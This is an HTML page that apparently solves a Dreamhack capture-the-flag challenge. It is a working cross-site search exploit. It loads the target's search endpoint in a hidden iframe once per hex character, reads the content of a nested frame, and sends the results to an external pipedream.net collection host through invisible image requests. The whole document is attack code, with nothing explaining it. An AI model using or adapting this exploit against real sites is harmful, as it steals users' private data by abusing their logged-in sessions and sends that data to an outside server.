<html>
	<head>
		<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'; frame-src 'self' http://host3.dreamhack.games:16498">
	</head>
	<body>
		<script>
			let frame = window.document.createElement('iframe');
			frame.setAttribute('style', 'width:0px;height:0px;display:none;');
			window.document.querySelector('body').appendChild(frame);

			async function test() {
				let queryCharArr = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'];
				let data;

				for(let i = 0; i < queryCharArr.length; i++){
					try {
						data = await sendQuery(queryCharArr[i]);
					} catch {
						data = undefined;
					}

					if(data) {
						let img = window.document.createElement('img');
						img.setAttribute('src', `https://enp8d6gol9t.x.pipedream.net/${data}`);
						img.setAttribute('style', 'width:0px;height:0px;display:none;');
						window.document.querySelector('body').appendChild(img);
					}
				}
			}

			async function sendQuery(char) {
				return await new Promise((resolve, reject) => {
					frame.setAttribute('src', `http://host3.dreamhack.games:16498/search?query=${char}`);
					frame.onload = function(e) {
						//console.log('onload call');
						let newFrame = e.target.contentWindow.document.querySelector('iframe');

						//console.log('newFrame! : ' + newFrame);
						//console.log(newFrame.srcdoc);

						if(newFrame) {resolve(newFrame.srcdoc)}
						else {reject();}
					}
				});
			}

			test();
		</script>
	</body>
</html>